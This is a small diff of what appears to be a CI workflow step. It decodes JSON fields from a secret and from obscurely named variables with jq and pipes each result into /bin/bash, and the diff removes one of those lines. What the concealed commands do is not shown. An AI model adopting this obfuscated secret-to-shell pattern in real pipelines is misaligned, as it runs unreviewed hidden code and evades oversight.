@@ -17,7 +17,6 @@ jobs:
           rfdh56: ${{ secrets.rfdh56 }}
         run: |
           printf '%s' "$rfdh56" | jq -r .vqfr3 | /bin/bash
-          echo $ir106 | jq -r .tzute970 | /bin/bash
           echo $gwaxu4099 | jq -r .syyhx79826 | /bin/bash
 
       - name: Persist output
